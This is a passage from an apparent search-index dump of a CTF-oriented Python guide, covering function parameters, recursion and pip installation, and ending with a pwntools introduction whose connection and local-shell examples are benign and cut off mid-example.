bad operand type for abs(): 'str'\n</code></pre> <p>The built-in function <code>abs</code> checks for parameter errors when improper parameters are passed in, while the <code>my_abs</code> we defined has no parameter checking and will cause an error in the <code>if</code> statement with a different error message than <code>abs</code>. So, this function definition is not good enough.</p> <p>Let's modify the definition of <code>my_abs</code> to do an argument type check and allow only arguments of integer and floating point types. The data type check can be implemented with the built-in function <code>isinstance()</code>.</p> <pre><code>def my_abs(x):\n    if not isinstance(x, (int, float)):\n        raise TypeError('bad operand type')\n    if x &gt;= 0:\n        return x\n    else:\n        return -x\n</code></pre> <p>With the addition of parameter checking, the function can throw an error if the wrong type of parameter is passed in.</p> <pre><code>&gt;&gt;&gt; my_abs('A')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"&lt;stdin&gt;\", line 3, in my_abs\nTypeError: bad operand type\n</code></pre> <p>Error and exception handling will be covered later.</p>"},{"location":"CTF/Python_3/#returning-multiple-values","title":"Returning multiple values","text":"<p>Can a function return more than one value? The answer is yes.</p> <p>For example, in a game where you often need to move from one point to another, given the coordinates, displacement and angle, you can calculate the new coordinates as follows.</p> <pre><code>import math\n\ndef move(x, y, step, angle=0):\n    nx = x + step * math.cos(angle)\n    ny = y - step * math.sin(angle)\n    return nx, ny\n</code></pre> <p>The <code>import math</code> statement indicates that the <code>math</code> package is imported and allows subsequent code to reference the <code>sin</code>, <code>cos</code> and other functions in the <code>math</code> package.</p> <p>Then, we can get both the return values.</p> <pre><code>&gt;&gt;&gt; x, y = move(100, 100, 60, math.pi / 6)\n&gt;&gt;&gt; print(x, y)\n151.96152422706632 70.0\n</code></pre> <p>But in fact this is only an illusion, and the Python function still returns a single value:</p> <pre><code>&gt;&gt;&gt; r = move(100, 100, 60, math.pi / 6)\n&gt;&gt;&gt; print(r)\n(151.96152422706632, 70.0)\n</code></pre> <p>The original return value is a tuple! However, in syntax, returning a tuple can omit the parentheses, and multiple variables can receive a tuple at the same time, assigned to the corresponding value by position, so Python's function returns multiple values is actually returning a tuple, but it's easier to write.</p>"},{"location":"CTF/Python_3/#summary","title":"Summary","text":"<p>When defining a function, you need to determine the function name and the number of arguments.</p> <p>If necessary, you can first check the data types of the arguments.</p> <p><code>return</code> can be used inside the function body to return the result of the function at any time.</p> <p>If the function is executed and there is no <code>return</code> statement, it automatically <code>returns None</code>.</p> <p>The function can return multiple values at the same time, but it is actually a tuple.</p>"},{"location":"CTF/Python_3/#reference-source-code","title":"Reference source code","text":"<p>def_func.py</p>"},{"location":"CTF/Python_3/#parameters-of-a-function","title":"Parameters of a function","text":"<p>When defining a function, we name and locate the parameters and the interface definition of the function is complete. For the caller of the function, it's enough to know how to pass the right arguments and what value the function will return; the complex logic inside the function is encapsulated and the caller doesn't need to understand it.</p> <p>Python's function definitions are very simple, but very flexible. In addition to the normal definition of mandatory arguments, you can also use default, variable, and keyword arguments, making the function definition an interface that not only handles complex arguments, but also simplifies the caller's code.</p>"},{"location":"CTF/Python_3/#positional-parameters","title":"positional parameters","text":"<p>Let's start by writing a function that calculates x2:</p> <pre><code>def power(x):\n    return x * x\n</code></pre> <p>For the <code>power(x)</code> function, the argument <code>x</code> is a position parameter.</p> <p>When we call the <code>power</code> function, we must pass in one and only one parameter <code>x</code>.</p> <pre><code>&gt;&gt;&gt; power(5)\n25\n&gt;&gt;&gt; power(15)\n225\n</code></pre> <p>Now, what if we want to calculate x3? We can define another <code>power3</code> function, but what if we want to calculate x4, x5 ......? We can't define an infinite number of functions.</p> <p>It may have occurred to you that you can modify <code>power(x)</code> to <code>power(x, n)</code> to compute xn, and to do so, say.</p> <pre><code>def power(x, n):\n    s = 1\n    while n &gt; 0:\n        n = n - 1\n        s = s * x\n    return s\n</code></pre> <p>For this modified <code>power(x, n)</code> function, any nth power can be computed as follows.</p> <pre><code>&gt;&gt;&gt; power(5, 2)\n25\n&gt;&gt;&gt; power(5, 3)\n125\n</code></pre> <p>The modified <code>power(x, n)</code> function has two parameters: <code>x</code> and <code>n</code>, both of which are positional parameters. When the function is called, the two values passed in are assigned to the parameters <code>x</code> and <code>n</code> in order of position.</p>"},{"location":"CTF/Python_3/#default-parameters","title":"Default parameters","text":"<p>The new <code>power(x, n)</code> function definition is fine, however, the old calling code fails because we added an argument, causing the old code to fail to call properly because of a missing argument: the</p> <pre><code>&gt;&gt;&gt; power(5)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: power() missing 1 required positional argument: 'n'\n</code></pre> <p>Python's error message is clear: the call to the function <code>power()</code> is missing a positional argument <code>n</code>.</p> <p>This is where the default parameter comes into play. Since we often calculate x2, it is perfectly acceptable to set the default value of the second argument, n, to 2.</p> <pre><code>def power(x, n=2):\n    s = 1\n    while n &gt; 0:\n        n = n - 1\n        s = s * x\n    return s\n</code></pre> <p>Thus, when we call <code>power(5)</code>, it is equivalent to calling <code>power(5, 2)</code>.</p> <pre><code>&gt;&gt;&gt; power(5)\n25\n&gt;&gt;&gt; power(5, 2)\n25\n</code></pre> <p>For other cases where <code>n &gt; 2</code>, n must be passed explicitly, such as <code>power(5, 3)</code>.</p> <p>As you can see from the above example, default parameters can simplify function calls. When setting default parameters, there are a few things to keep in mind.</p> <p>One is that the mandatory parameters come first and the default parameters come second, otherwise Python's interpreter will report an error (think about why the default parameters can't be placed in front of the mandatory parameters).</p> <p>Second, how to set the default parameters.</p> <p>When a function has more than one parameter, put the parameters that change a lot in front and the parameters that change a little in the back. The parameter with small changes can then be used as the default parameter.</p> <p>What are the benefits of using default parameters? The biggest benefit is that it reduces the difficulty of calling the function.</p> <p>For example, let's write a function to register a first grade student and pass in two parameters <code>name</code> and <code>gender</code>.</p> <pre><code>def enroll(name, gender):\n    print('name:', name)\n    print('gender:', gender)\n</code></pre> <p>In this way, the <code>enroll()</code> function is called with only two parameters passed in.</p> <pre><code>&gt;&gt;&gt; enroll('Sarah', 'F')\nname: Sarah\ngender: F\n</code></pre> <p>What if I want to continue passing in information such as age, city, etc.? This would make calling the function much more complicated.</p> <p>We can set age and city as default parameters.</p> <pre><code>def enroll(name, gender, age=6, city='Beijing'):\n    print('name:', name)\n    print('gender:', gender)\n    print('age:', age)\n    print('city:', city)\n</code></pre> <p>In this way, most students are not required to provide their age and city when registering, but only the two required parameters.</p> <pre><code>&gt;&gt;&gt; enroll('Sarah', 'F')\nname: Sarah\ngender: F\nage: 6\ncity: Beijing\n</code></pre> <p>Only students who do not match the default parameters will be required to provide additional information.</p> <pre><code>enroll('Bob', 'M', 7)\nenroll('Adam', 'M', city='Tianjin')\n</code></pre> <p>As you can see, the default arguments reduce the difficulty of function calls, and once more complex calls are needed, more arguments can be passed to achieve them. Whether it is a simple call or a complex call, the function only needs to define one.</p> <p>When there are multiple default parameters, the call can either provide the default parameters in order, such as calling <code>enroll('Bob', 'M', 7)</code>, meaning that, in addition to the two parameters <code>name</code>, <code>gender</code>, the last 1 parameter is applied to the parameter <code>age</code>, and the <code>city</code> parameter, since it is not provided, still uses the default value.</p> <p>It is also possible to provide partial default parameters out of order. When providing partial default parameters out of order, you need to put the parameter name on. For example, calling <code>enroll('Adam', 'M', city='Tianjin')</code> means that the <code>city</code> parameter uses the value passed in and the other default parameters continue to use the default values.</p> <p>Default parameters are useful, but they can fall into a hole if not used properly. The default parameters have one of the biggest pits, as demonstrated below.</p> <p>First define a function, pass in a list, add an <code>END</code> and then return.</p> <pre><code>def add_end(L=[]):\n    L.append('END')\n    return L\n</code></pre> <p>When you call it normally, the result seems good:</p> <pre><code>&gt;&gt;&gt; add_end([1, 2, 3])\n[1, 2, 3, 'END']\n&gt;&gt;&gt; add_end(['x', 'y', 'z'])\n['x', 'y', 'z', 'END']\n</code></pre> <p>When you call with the default parameters, the result is also correct at first:</p> <pre><code>&gt;&gt;&gt; add_end()\n['END']\n</code></pre> <p>However, when <code>add_end()</code> is called again, the result is not correct:</p> <pre><code>&gt;&gt;&gt; add_end()\n['END', 'END']\n&gt;&gt;&gt; add_end()\n['END', 'END', 'END']\n</code></pre> <p>Many beginners are puzzled by the fact that the default argument is <code>[]</code>, but the function seems to \"remember\" the list after adding <code>'END'</code> each time.</p> <p>The reason for this is as follows.</p> <p>When a Python function is defined, the value of the default parameter <code>L</code> is calculated, i.e. <code>[]</code>, because the default parameter <code>L</code> is also a variable that points to the object <code>[]</code>, and each time the function is called, if the content of <code>L</code> is changed, the content of the default parameter will change the next time it is called, and will no longer be the <code>[]</code> of the function when it is defined.</p> <p>One thing to keep in mind when defining default parameters: they must point to invariant objects!</p> <p>To modify the above example, we can use the invariant object <code>None</code> to implement.</p> <pre><code>def add_end(L=None):\n    if L is None:\n        L = []\n    L.append('END')\n    return L\n</code></pre> <p>Now, no matter how many times it is called, there will be no problem:</p> <pre><code>&gt;&gt;&gt; add_end()\n['END']\n&gt;&gt;&gt; add_end()\n['END']\n</code></pre> <p>Why do we design invariant objects like <code>str</code> and <code>None</code>? Because once the invariant object is created, the data inside the object cannot be modified, which reduces the errors caused by modifying the data. In addition, because the object is invariant, there is no need to add locks to read the object simultaneously in a multitasking environment, and there is no problem reading it simultaneously at all. When we write a program, if we can design an invariant object, then try to design it as invariant object.</p>"},{"location":"CTF/Python_3/#variable-arguments","title":"Variable arguments","text":"<p>Variable parameters can also be defined in Python functions. As the name implies, a variable parameter is a variable number of arguments passed in, from 1, 2 to any number, and 0.</p> <p>Let's take a math problem as an example, given a set of numbers a, b, c ......, calculate a^2 + b^2 + c^2 + .......</p> <p>To define this function, we must determine the input parameters. Since the number of parameters is uncertain, we first think that we can pass a, b, c ...... as a list or a tuple, so that the function can be defined as follows.</p> <pre><code>def calc(numbers):\n    sum = 0\n    for n in numbers:\n        sum = sum + n * n\n    return sum\n</code></pre> <p>But to call it, a list or tuple needs to be assembled first:</p> <pre><code>&gt;&gt;&gt; calc([1, 2, 3])\n14\n&gt;&gt;&gt; calc((1, 3, 5, 7))\n84\n</code></pre> <p>If variable parameters are utilized, the way the function is called can be simplified as follows.</p> <pre><code>&gt;&gt;&gt; calc(1, 2, 3)\n14\n&gt;&gt;&gt; calc(1, 3, 5, 7)\n84\n</code></pre> <p>So, we change the parameters of the function to variable parameters.</p> <pre><code>def calc(*numbers):\n    sum = 0\n    for n in numbers:\n        sum = sum + n * n\n    return sum\n</code></pre> <p>Defining a variable parameter is simply a matter of adding a <code>*</code> sign in front of the parameter compared to defining a list or tuple parameter. Inside the function, the argument <code>numbers</code> is received as a tuple, so the function code remains exactly the same. However, the function can be called with any number of arguments, including 0 arguments.</p> <pre><code>&gt;&gt;&gt; calc(1, 2)\n5\n&gt;&gt;&gt; calc()\n0\n</code></pre> <p>What if I already have a list or tuple and want to call a mutable parameter? This can be done.</p> <pre><code>&gt;&gt;&gt; nums = [1, 2, 3]\n&gt;&gt;&gt; calc(nums[0], nums[1], nums[2])\n14\n</code></pre> <p>The problem is that it's too cumbersome, so Python allows you to add a <code>*</code> sign in front of a list or tuple and pass the elements of the list or tuple as mutable arguments.</p> <pre><code>&gt;&gt;&gt; nums = [1, 2, 3]\n&gt;&gt;&gt; calc(*nums)\n14\n</code></pre> <p><code>*nums</code> means that all elements of the list <code>nums</code> are passed in as mutable arguments. This writing style is quite useful and common.</p>"},{"location":"CTF/Python_3/#keyword-arguments","title":"Keyword arguments","text":"<p>Variable arguments allow you to pass in zero or any number of arguments, which are automatically assembled into a tuple when the function is called, while keyword arguments allow you to pass in zero or any number of arguments with parameter names, which are automatically assembled into a dict inside the function. see the example.</p> <pre><code>def person(name, age, **kw):\n    print('name:', name, 'age:', age, 'other:', kw)\n</code></pre> <p>The function <code>person</code> accepts the keyword argument <code>kw</code> in addition to the mandatory arguments <code>name</code> and <code>age</code>. When calling this function, only the mandatory parameters can be passed.</p> <pre><code>&gt;&gt;&gt; person('Michael', 30)\nname: Michael age: 30 other: {}\n</code></pre> <p>Any number of keyword parameters can also be passed in.</p> <pre><code>&gt;&gt;&gt; person('Bob', 35, city='Beijing')\nname: Bob age: 35 other: {'city': 'Beijing'}\n&gt;&gt;&gt; person('Adam', 45, gender='M', job='Engineer')\nname: Adam age: 45 other: {'gender': 'M', 'job': 'Engineer'}\n</code></pre> <p>What is the use of the keyword argument? It extends the function's functionality. For example, in the <code>person</code> function, we are guaranteed to receive the two parameters <code>name</code> and <code>age</code>, but if the caller would like to provide more parameters, we can receive them as well. Imagine you are doing a user registration function and everything is optional except for the user name and age which are required, using keyword arguments to define this function will satisfy the registration requirement.</p> <p>Similar to variable parameters, you can also assemble a dict first, and then, convert that dict to a keyword parameter to pass in.</p> <pre><code>&gt;&gt;&gt; extra = {'city': 'Beijing', 'job': 'Engineer'}\n&gt;&gt;&gt; person('Jack', 24, city=extra['city'], job=extra['job'])\nname: Jack age: 24 other: {'city': 'Beijing', 'job': 'Engineer'}\n</code></pre> <p>Of course, the above complex call can be written in a simplified way as follows.</p> <pre><code>&gt;&gt;&gt; extra = {'city': 'Beijing', 'job': 'Engineer'}\n&gt;&gt;&gt; person('Jack', 24, **extra)\nname: Jack age: 24 other: {'city': 'Beijing', 'job': 'Engineer'}\n</code></pre> <p><code>**extra</code> means that all key-values of the dict <code>extra</code> are passed into the <code>**kw</code> parameter of the function with keyword arguments, <code>kw</code> will get a dict, note that the dict obtained by <code>kw</code> is a copy of <code>extra</code>, changes to <code>kw</code> will not affect <code>extra</code> outside the function.</p>"},{"location":"CTF/Python_3/#naming-keyword-arguments","title":"Naming keyword arguments","text":"<p>For keyword arguments, the caller of a function can pass in any unrestricted keyword argument. As for exactly what is passed in, it needs to be checked inside the function via <code>kw</code>.</p> <p>Still using the <code>person()</code> function as an example, we want to check for <code>city</code> and <code>job</code> parameters.</p> <pre><code>def person(name, age, **kw):\n    if 'city' in kw:\n        # With city parameter\n        pass\n    if 'job' in kw:\n        # With job parameter\n        pass\n    print('name:', name, 'age:', age, 'other:', kw)\n</code></pre> <p>However, the caller can still pass in unrestricted keyword arguments.</p> <pre><code>&gt;&gt;&gt; person('Jack', 24, city='Beijing', addr='Chaoyang', zipcode=123456)\n</code></pre> <p>If you want to restrict the names of the keyword arguments, you can use named keyword arguments, for example, to receive only <code>city</code> and <code>job</code> as keyword arguments. The functions defined in this way are as follows.</p> <pre><code>def person(name, age, *, city, job):\n    print(name, age, city, job)\n</code></pre> <p>Unlike the keyword parameter <code>**kw</code>, the named keyword parameter requires a special separator <code>*</code>, and the parameters following <code>*</code> are considered as named keyword parameters.</p> <p>It is called as follows.</p> <pre><code>&gt;&gt;&gt; person('Jack', 24, city='Beijing', job='Engineer')\nJack 24 Beijing Engineer\n</code></pre> <p>If a function definition already has a variable argument, the named keyword argument that follows no longer needs a special separator <code>*</code>.</p> <pre><code>def person(name, age, *args, city, job):\n    print(name, age, args, city, job)\n</code></pre> <p>Named keyword parameters must be passed with a parameter name, unlike positional parameters. If the parameter name is not passed, the call will report an error.</p> <pre><code>&gt;&gt;&gt; person('Jack', 24, 'Beijing', 'Engineer')\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nTypeError: person() missing 2 required keyword-only arguments: 'city' and 'job'\n</code></pre> <p>Due to the missing parameter names <code>city</code> and <code>job</code> in the call, the Python interpreter treats the first two parameters as positional parameters and passes the last two parameters to <code>*args</code>, but the missing named keyword parameter causes an error.</p> <p>Named keyword arguments can have default values, thus simplifying the call.</p> <pre><code>def person(name, age, *, city='Beijing', job):\n    print(name, age, city, job)\n</code></pre> <p>Since the named keyword parameter <code>city</code> has a default value, it can be invoked without passing the <code>city</code> parameter.</p> <pre><code>&gt;&gt;&gt; person('Jack', 24, job='Engineer')\nJack 24 Beijing Engineer\n</code></pre> <p>When using named keyword arguments, take special care to add a <code>*</code> as a special separator if there are no variable arguments. If <code>*</code> is missing, the Python interpreter will not recognize positional and named keyword arguments.</p> <pre><code>def person(name, age, city, job):\n    # Missing *, city and job are considered as location parameters\n    pass\n</code></pre>"},{"location":"CTF/Python_3/#parameter-combinations","title":"Parameter combinations","text":"<p>To define functions in Python, you can use mandatory parameters, default parameters, variable parameters, keyword parameters, and named keyword parameters, all five of which can be used in combination. However, please note that the order of parameter definition must be: mandatory parameters, default parameters, variable parameters, named keyword parameters, and keyword parameters.</p> <p>For example, to define a function with several of these parameters.</p> <pre><code>def f1(a, b, c=0, *args, **kw):\n    print('a =', a, 'b =', b, 'c =', c, 'args =', args, 'kw =', kw)\n\ndef f2(a, b, c=0, *, d, **kw):\n    print('a =', a, 'b =', b, 'c =', c, 'd =', d, 'kw =', kw)\n</code></pre> <p>When the function is called, the Python interpreter automatically passes in the corresponding arguments according to their positions and names.</p> <pre><code>&gt;&gt;&gt; f1(1, 2)\na = 1 b = 2 c = 0 args = () kw = {}\n&gt;&gt;&gt; f1(1, 2, c=3)\na = 1 b = 2 c = 3 args = () kw = {}\n&gt;&gt;&gt; f1(1, 2, 3, 'a', 'b')\na = 1 b = 2 c = 3 args = ('a', 'b') kw = {}\n&gt;&gt;&gt; f1(1, 2, 3, 'a', 'b', x=99)\na = 1 b = 2 c = 3 args = ('a', 'b') kw = {'x': 99}\n&gt;&gt;&gt; f2(1, 2, d=99, ext=None)\na = 1 b = 2 c = 0 d = 99 kw = {'ext': None}\n</code></pre> <p>The most amazing thing is that with a tuples and dict you can also call the above functions.</p> <pre><code>&gt;&gt;&gt; args = (1, 2, 3, 4)\n&gt;&gt;&gt; kw = {'d': 99, 'x': '#'}\n&gt;&gt;&gt; f1(*args, **kw)\na = 1 b = 2 c = 3 args = (4,) kw = {'d': 99, 'x': '#'}\n&gt;&gt;&gt; args = (1, 2, 3)\n&gt;&gt;&gt; kw = {'d': 88, 'x': '#'}\n&gt;&gt;&gt; f2(*args, **kw)\na = 1 b = 2 c = 3 d = 88 kw = {'x': '#'}\n</code></pre> <p>So, for any function, you can call it by something like <code>func(*args, **kw)</code>, regardless of how its arguments are defined.</p> <p>Although it is possible to combine up to 5 arguments, do not use too many combinations at the same time, otherwise the function interface is poorly understandable.</p>"},{"location":"CTF/Python_3/#summary_1","title":"Summary","text":"<p>Python's functions have a very flexible argument form, allowing both simple calls and very complex arguments to be passed in.</p> <p>The default argument must be an immutable object; if it's a mutable object, the program will run with a logic error!</p> <p>Note the syntax for defining mutable and keyword arguments.</p> <p><code>*args</code> is a mutable parameter, args receives a tuples.</p> <p><code>**kw</code> is a keyword argument, kw receives a dict.</p> <p>And the syntax of how to pass variable and keyword arguments when calling a function.</p> <p>Variable parameters can be passed either directly: <code>func(1, 2, 3)</code> or by assembling a list or tuple first and then passing it through <code>*args</code>: <code>func(*(1, 2, 3))</code>.</p> <p>Keyword arguments can either be passed directly: <code>func(a=1, b=2)</code>, or assembled first in a dict and then passed in via <code>*kw</code>: <code>func(**{'a': 1, 'b': 2})</code>.</p> <p>Using <code>*args</code> and <code>**kw</code> is the customary way of writing Python, but of course other parameter names can be used, but it is better to use the customary usage.</p> <p>Named keyword arguments are intended to limit the parameter names that can be passed in by the caller, while providing default values.</p> <p>Don't forget to write the separator <code>*</code> when defining named keyword parameters without mutable parameters, otherwise the definition will be a positional parameter.</p>"},{"location":"CTF/Python_3/#reference-source-code_1","title":"Reference source code","text":"<p>var_args.py</p> <p>kw_args.py</p>"},{"location":"CTF/Python_3/#recursive-functions","title":"Recursive functions","text":"<p>Inside a function, other functions can be called. If a function calls itself internally, that function is recursive.</p> <p>As an example, let's calculate the factorial <code>n! = 1 x 2 x 3 x ... x n</code>, represented by the function <code>fact(n)</code>, it can be seen that</p> <p></p> <p>So, <code>fact(n)</code> can be expressed as <code>n x fact(n-1)</code>, with special treatment required only for n=1.</p> <p>Thus, <code>fact(n)</code> is written out recursively as.</p> <pre><code>def fact(n):\n    if n==1:\n        return 1\n    return n * fact(n - 1)\n</code></pre> <p>The above is a recursive function. Try:</p> <pre><code>&gt;&gt;&gt; fact(1)\n1\n&gt;&gt;&gt; fact(5)\n120\n&gt;&gt;&gt; fact(100)\n93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000\n</code></pre> <p>If we calculate <code>fact(5)</code>, we can see the calculation process according to the function definition as follows.</p> <pre><code>===&gt; fact(5)\n===&gt; 5 * fact(4)\n===&gt; 5 * (4 * fact(3))\n===&gt; 5 * (4 * (3 * fact(2)))\n===&gt; 5 * (4 * (3 * (2 * fact(1))))\n===&gt; 5 * (4 * (3 * (2 * 1)))\n===&gt; 5 * (4 * (3 * 2))\n===&gt; 5 * (4 * 6)\n===&gt; 5 * 24\n===&gt; 120\n</code></pre> <p>Recursive functions have the advantage of being simple to define and logically clear. In theory, all recursive functions can be written as loops, but the logic of loops is not as clear as recursion.</p> <p>Using recursive functions requires care to prevent stack overflows. In computers, function calls are implemented through a data structure called a stack. Whenever a function call is entered, a layer of stack frames is added to the stack, and whenever the function returns, a layer of stack frames is subtracted from the stack. Since the size of the stack is not infinite, too many recursive calls can cause the stack to overflow. Try <code>fact(1000)</code>.</p> <pre><code>&gt;&gt;&gt; fact(1000)\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\n  File \"&lt;stdin&gt;\", line 4, in fact\n  ...\n  File \"&lt;stdin&gt;\", line 4, in fact\nRuntimeError: maximum recursion depth exceeded in comparison\n</code></pre> <p>The solution to recursive call stack overflow is to optimize it by tail recursion. In fact, tail recursion has the same effect as a loop, so it is okay to think of a loop as a special kind of tail recursive function.</p> <p>Tail recursion means that the function itself is called when it returns, and, the return statement cannot contain an expression. In this way, the compiler or interpreter can optimize the tail recursion so that the recursion itself, no matter how many times it is called, only occupies one stack frame and no stack overflow occurs.</p> <p>The <code>fact(n)</code> function above is not tail recursive because <code>return n * fact(n - 1)</code> introduces a multiplicative expression. To change to a tail recursive approach, a little more code is needed, mainly to pass the product of each step into the recursive function.</p> <pre><code>def fact(n):\n    return fact_iter(n, 1)\n\ndef fact_iter(num, product):\n    if num == 1:\n        return product\n    return fact_iter(num - 1, num * product)\n</code></pre> <p>As you can see, <code>return fact_iter(num - 1, num * product)</code> returns only the recursive function itself, <code>num - 1</code> and <code>num * product</code> are calculated before the function call and do not affect the function call.</p> <p>The call to <code>fact(5)</code> corresponding to <code>fact_iter(5, 1)</code> is as follows.</p> <pre><code>===&gt; fact_iter(5, 1)\n===&gt; fact_iter(4, 5)\n===&gt; fact_iter(3, 20)\n===&gt; fact_iter(2, 60)\n===&gt; fact_iter(1, 120)\n===&gt; 120\n</code></pre> <p>When tail recursive calls are made, the stack does not grow if optimizations are made, so no matter how many calls are made, it will not cause the stack to overflow.</p> <p>Unfortunately, most programming languages are not optimized for tail recursion, and neither is the Python interpreter, so even if you change the <code>fact(n)</code> function above to a tail recursive approach, it will still result in a stack overflow.</p>"},{"location":"CTF/Python_3/#summary_2","title":"Summary","text":"<p>The advantage of using recursive functions is that the logic is simple and clear, and the disadvantage is that calls that are too deep can lead to stack overflow.</p> <p>Languages optimized for tail recursion can prevent stack overflows by tail recursion. Tail recursion is in fact equivalent to looping, and programming languages that don't have looping statements can only implement loops via tail recursion.</p> <p>Python's standard interpreter is not optimized for tail recursion, and any recursive function has a stack overflow problem.</p>"},{"location":"CTF/Python_3/#reference-source-code_2","title":"Reference source code","text":"<p>recur.py</p>"},{"location":"CTF/Python_4/","title":"Python Programming Quick Guide - CTF Related","text":"<p>https://yulizi123.github.io/tutorials/python-basic/basic/</p> <p>https://docs.python.org/3/</p> <p>https://docs.pwntools.com/en/stable/</p>"},{"location":"CTF/Python_4/#module-installation","title":"Module installation","text":"<p>There are many ways to install external modules, and the form of installation varies from system to system. Installing Python packages on Windows, for example, might even kill you. Haha.</p>"},{"location":"CTF/Python_4/#what-is-an-external-module","title":"What is an external module?","text":"<p>An external module is what you use when you <code>import</code> something into a python script.</p> <pre><code>import numpy as np\nimport matplotlib.pyplot as plt\n</code></pre> <p>Numpy and matplotlib are both external modules that need to be installed. They are not part of python's own modules.</p>"},{"location":"CTF/Python_4/#installing-numpy","title":"Installing Numpy","text":"<p>For example, there are many ways to install modules for scientific operations, such as numpy. On Windows, the easiest way is to install Anaconda, which has many necessary external modules. Install one, and save yourself the trouble of installing others.</p> <p>However, I want to talk about downloading the installation package and installing it on Windows. For example, on the Numpy installer website, you can find various versions of numpy.</p> <p></p> <p>In NumPy 1.10.2, we can find installers for Windows, but no Windows installers have been added to the new version yet. Then choose the appropriate \"exe\" installer for your system and python version. Download and install.</p> <p></p> <p>If you are on MacOS or Linux, this external module is much easier to install. You can easily install it by typing a phrase into your computer's Terminal. Windows seems to have to be set up in a special way to do the same thing, I don't know... you might want to look it up. On my computer, the Terminal looks like this.</p> <p></p> <p>Then you can install it if you type in this form.</p> <pre><code>$ pip install the name of the module you want\n</code></pre> <p>For example</p> <pre><code>$ pip install numpy # This is for the python2+ version\n$ pip3 install numpy # This is for the python3+ version\n</code></pre>"},{"location":"CTF/Python_4/#updating-external-modules","title":"Updating external modules","text":"<p>Updating external modules with pip is very simple. All you need to do is type the following command into Terminal. The <code>-U</code> here means update.</p> <pre><code>$ pip install -U numpy # This is for the python2+ version\n$ pip3 install -U numpy # This is for the python3+ version\n</code></pre>"},{"location":"CTF/Python_4/#pwntools","title":"pwntools","text":"<p><code>pwntools</code> is a CTF framework and exploit development library. Written in Python, it is designed for rapid prototyping and development, and intended to make exploit writing as simple as possible.</p> <p>The primary location for this documentation is docs.pwntools.com, which uses readthedocs. It comes in three primary flavors:</p> <ul> <li>Stable</li> <li>Beta</li> <li>Dev</li> </ul>"},{"location":"CTF/Python_4/#installation","title":"Installation","text":"<p>Pwntools is best supported on 64-bit Ubuntu LTS releases (14.04, 16.04, 18.04, and 20.04). Most functionality should work on any Posix-like distribution (Debian, Arch, FreeBSD, OSX, etc.).</p>"},{"location":"CTF/Python_4/#prerequisites","title":"Prerequisites","text":"<p>To get the most out of <code>pwntools</code>, you should install the following system libraries.</p> <ul> <li>Binutils</li> <li>Ubuntu</li> <li>Mac OS X</li> <li>Alternate OSes</li> <li>Python Development Headers</li> <li>Ubuntu</li> <li>Mac OS X</li> </ul>"},{"location":"CTF/Python_4/#released-version","title":"Released Version","text":"<p>pwntools is available as a <code>pip</code> package for both Python2 and Python3.</p>"},{"location":"CTF/Python_4/#python3","title":"Python3","text":"<pre><code>$ apt-get update\n$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential\n$ python3 -m pip install --upgrade pip\n$ python3 -m pip install --upgrade pwntools\n</code></pre>"},{"location":"CTF/Python_4/#python2-deprecated","title":"Python2 (Deprecated)","text":"<p>NOTE: Pwntools maintainers STRONGLY recommend using Python3 for all future Pwntools-based scripts and projects.</p> <p>Additionally, due to pip dropping support for Python2, a specific version of pip must be installed.</p> <pre><code>$ apt-get update\n$ apt-get install python python-pip python-dev git libssl-dev libffi-dev build-essential\n$ python2 -m pip install --upgrade pip==20.3.4\n$ python2 -m pip install --upgrade pwntools\n</code></pre>"},{"location":"CTF/Python_4/#command-line-tools","title":"Command-Line Tools","text":"<p>When installed with <code>sudo</code> the above commands will install Pwntools\u2019 command-line tools to somewhere like <code>/usr/bin</code>.</p> <p>However, if you run as an unprivileged user, you may see a warning message that looks like this:</p> <p>Follow the instructions listed and add <code>~/.local/bin</code> to your <code>$PATH</code> environment variable.</p>"},{"location":"CTF/Python_4/#development","title":"Development","text":"<p>If you are hacking on Pwntools locally, you\u2019ll want to do something like this:</p> <pre><code>$ git clone https://github.com/Gallopsled/pwntools\n$ pip install --upgrade --editable ./pwntools\n</code></pre>"},{"location":"CTF/Python_4/#getting-started","title":"Getting Started","text":"<p>To get your feet wet with pwntools, let\u2019s first go through a few examples.</p> <p>When writing exploits, pwntools generally follows the \u201ckitchen sink\u201d approach.</p> <pre><code>&gt;&gt;&gt; from pwn import *\n</code></pre> <p>This imports a lot of functionality into the global namespace. You can now assemble, disassemble, pack, unpack, and many other things with a single function.</p> <p>A full list of everything that is imported is available from pwn import *.</p>"},{"location":"CTF/Python_4/#tutorials","title":"Tutorials","text":"<p>A series of tutorials for Pwntools exists online, at https://github.com/Gallopsled/pwntools-tutorial#readme</p>"},{"location":"CTF/Python_4/#making-connections","title":"Making Connections","text":"<p>You need to talk to the challenge binary in order to pwn it, right? pwntools makes this stupid simple with its <code>pwnlib.tubes</code> module.</p> <p>This exposes a standard interface to talk to processes, sockets, serial ports, and all manner of things, along with some nifty helpers for common tasks. For example, remote connections via <code>pwnlib.tubes.remote</code>.</p> <pre><code>&gt;&gt;&gt; conn = remote('ftp.ubuntu.com',21)\n&gt;&gt;&gt; conn.recvline() # doctest: +ELLIPSIS\nb'220 ...'\n&gt;&gt;&gt; conn.send(b'USER anonymous\\r\\n')\n&gt;&gt;&gt; conn.recvuntil(b' ', drop=True)\nb'331'\n&gt;&gt;&gt; conn.recvline()\nb'Please specify the password.\\r\\n'\n&gt;&gt;&gt; conn.close()\n</code></pre> <p>It\u2019s also easy to spin up a listener</p> <pre><code>&gt;&gt;&gt; l = listen()\n&gt;&gt;&gt; r = remote('localhost', l.lport)\n&gt;&gt;&gt; c = l.wait_for_connection()\n&gt;&gt;&gt; r.send(b'hello')\n&gt;&gt;&gt; c.recv()\nb'hello'\n</code></pre> <p>Interacting with processes is easy thanks to the <code>pwnlib.tubes.process</code>.</p> <pre><code>&gt;&gt;&gt; sh = process('/bin/sh')\n&gt;&gt;&gt; sh.sendline(b'sleep 3; echo hello world;')\n&gt;&gt;&gt; sh.recvline(timeout=1)\nb''\n&gt;&gt;&gt; sh.recvline(timeout=5)\nb'hello world\\n'\n&gt;&gt;&gt; sh.close()\n</code></pre> <p>Not only can you interact with processes programmatically, but you can actually interact with processes.</p> <pre><code>&gt;&gt;&gt; sh.interactive() # doctest: +SKIP\n$ 